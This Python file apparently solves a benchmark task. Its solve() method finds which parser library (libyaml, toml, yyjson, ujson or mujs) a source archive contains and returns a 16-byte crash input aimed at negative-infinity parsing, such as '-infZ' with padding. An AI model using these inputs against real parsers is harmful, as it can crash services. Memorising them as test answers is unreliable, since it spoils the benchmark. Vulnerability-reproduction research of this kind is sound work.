import os
import tarfile
import io
import re

class Solution:
    def _iter_files_in_tar(self, src_path):
        try:
            with tarfile.open(src_path, 'r:*') as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    yield m.name
        except tarfile.ReadError:
            return

    def _read_file_snippet_from_tar(self, src_path, member_name, max_bytes=8192):
        try:
            with tarfile.open(src_path, 'r:*') as tf:
                try:
                    f = tf.extractfile(member_name)
                except KeyError:
                    return b""
                if not f:
                    return b""
                data = f.read(max_bytes)
                return data if isinstance(data, bytes) else data.encode('utf-8', 'ignore')
        except tarfile.ReadError:
            return b""

    def _iter_files_in_dir(self, src_path):
        for root, _, files in os.walk(src_path):
            for fn in files:
                yield os.path.join(root, fn)

    def _read_file_snippet_from_dir(self, full_path, max_bytes=8192):
        try:
            with open(full_path, 'rb') as f:
                return f.read(max_bytes)
        except Exception:
            return b""

    def _detect_project(self, src_path):
        is_tar = False
        try:
            with tarfile.open(src_path, 'r:*'):
                is_tar = True
        except tarfile.ReadError:
            is_tar = False

        names_lower = []
        sample_text = b""
        count = 0

        if is_tar:
            for name in self._iter_files_in_tar(src_path):
                ln = name.lower()
                names_lower.append(ln)
                if count < 100:
                    sample_text += self._read_file_snippet_from_tar(src_path, name, 2048)
                    count += 1
        else:
            if os.path.isdir(src_path):
                for full in self._iter_files_in_dir(src_path):
                    rel = os.path.relpath(full, src_path).lower()
                    names_lower.append(rel)
                    if count < 100:
                        sample_text += self._read_file_snippet_from_dir(full, 2048)
                        count += 1

        text_lower = sample_text.lower()

        # Detection heuristics
        # libyaml
        if any('yaml.h' in n for n in names_lower) or b'libyaml' in text_lower or b'yaml_parser' in text_lower:
            return 'libyaml'

        # toml
        if any(('toml.h' in n or 'toml.c' in n or 'toml++' in n or 'toml11' in n or 'libtoml' in n) for n in names_lower) or b'toml' in text_lower:
            return 'toml'

        # yyjson
        if any('yyjson' in n for n in names_lower) or b'yyjson' in text_lower:
            return 'yyjson'

        # ultrajson
        if any('ultrajson' in n or 'ujson' in n for n in names_lower) or b'ultrajson' in text_lower or b'ujson' in text_lower:
            return 'ujson'

        # mujs / js
        if any('mujs' in n for n in names_lower) or b'mujs' in text_lower or b'Infinity' in sample_text:
            return 'js'

        return 'unknown'

    def _poc_for_libyaml(self):
        # 16 bytes
        return b"a: -.InfZ\nzzzzzz"

    def _poc_for_toml(self):
        # 16 bytes
        return b"v=-infZ\nzzzzzzzz"

    def _poc_for_yyjson(self):
        # 16 bytes
        return b"[-infZ]aaaaaaaa"

    def _poc_for_ujson(self):
        # 16 bytes
        return b"-InfinityZaaaaab"

    def _poc_generic(self):
        # 16 bytes generic guess targeting sign+inf parsing
        return b"-infZaaaaaaaaaa"

    def solve(self, src_path: str) -> bytes:
        proj = self._detect_project(src_path)
        if proj == 'libyaml':
            return self._poc_for_libyaml()
        if proj == 'toml':
            return self._poc_for_toml()
        if proj == 'yyjson':
            return self._poc_for_yyjson()
        if proj == 'ujson':
            return self._poc_for_ujson()
        if proj == 'js':
            return b"-Infinity+zzzzzz"[:16]
        return self._poc_generic()